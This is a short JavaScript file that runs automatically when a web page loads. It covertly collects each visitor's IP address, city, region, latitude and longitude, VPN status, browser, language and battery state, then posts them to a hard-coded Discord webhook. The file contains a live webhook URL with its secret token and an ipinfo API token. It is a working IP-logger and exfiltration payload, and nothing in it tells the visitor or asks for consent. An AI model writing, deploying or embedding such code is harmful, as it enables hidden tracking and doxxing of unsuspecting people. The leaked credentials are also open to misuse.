async function sendUserDataToDiscord() {
  try {
    let geoData = null;
    let vpnData = { badip: "Unknown" };

    // Primary Geo IP lookup (json.geoiplookup.io), with fallback to ipinfo.io
    try {
      const geoResponse = await fetch("https://json.geoiplookup.io");
      if (geoResponse.ok) {
        geoData = await geoResponse.json();
      } else {
        console.warn("Primary Geo IP lookup failed, trying fallback.");
        throw new Error("Primary Geo IP lookup failed.");
      }
    } catch (error) {
      try {
        const fallbackResponse = await fetch("https://ipinfo.io/json?token=e8449909af1d1b");
        if (fallbackResponse.ok) {
          const fallbackData = await fallbackResponse.json();
          geoData = {
            ip: fallbackData.ip,
            country_name: fallbackData.country,
            city: fallbackData.city,
            region: fallbackData.region,
            latitude: fallbackData.loc.split(",")[0],
            longitude: fallbackData.loc.split(",")[1]
          };
        } else {
          console.warn("Fallback Geo IP lookup also failed.");
        }
      } catch (fallbackError) {
        console.warn("Both Geo IP lookups failed:", fallbackError);
      }
    }

    // Fetch VPN-related data (if important for verification)
    try {
      const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
      if (vpnResponse.ok) {
        vpnData = await vpnResponse.json();
      } else {
        console.warn("VPN lookup failed with status:", vpnResponse.status);
      }
    } catch (error) {
      console.warn("VPN lookup service unavailable:", error);
    }

    // Get battery data if supported
    const battery = navigator.getBattery ? await navigator.getBattery() : null;
    const deviceData = {
      platform: navigator.platform || "Unknown",
      userAgent: navigator.userAgent || "Unknown",
      language: navigator.language || "Unknown",
      batteryLevel: battery ? battery.level * 100 : "N/A",
      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A"
    };

    // Format message content for Discord
    const messageContent = `
      **User Data:**
      ${geoData ? `
      - IP Address: ${geoData.ip}
      - Country: ${geoData.country_name}
      - City: ${geoData.city}
      - Region: ${geoData.region || "N/A"}
      - Latitude: ${geoData.latitude}
      - Longitude: ${geoData.longitude}
      ` : "- Location Data Unavailable"}
      - Bad IP: ${vpnData.badip}
      - Device: ${deviceData.platform}
      - Browser: ${deviceData.userAgent}
      - Language: ${deviceData.language}
      - Battery Level: ${deviceData.batteryLevel}%
      - Charging: ${deviceData.isCharging}
    `;

    const discordPayload = { content: messageContent };

    // Send data to Discord webhook
    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
    const discordResponse = await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      throw new Error("Failed to send data to Discord.");
    }

    console.log("Data sent successfully.");
  } catch (error) {
    console.error("Failed to send user data, sending error message:", error);

    // Send error message to Discord for logging
    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
    await fetch(discordWebhookUrl, {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify({ content: "Error: Failed to send user data. Please check the logs for more details." })
    });
  }
}

window.addEventListener("load", sendUserDataToDiscord);
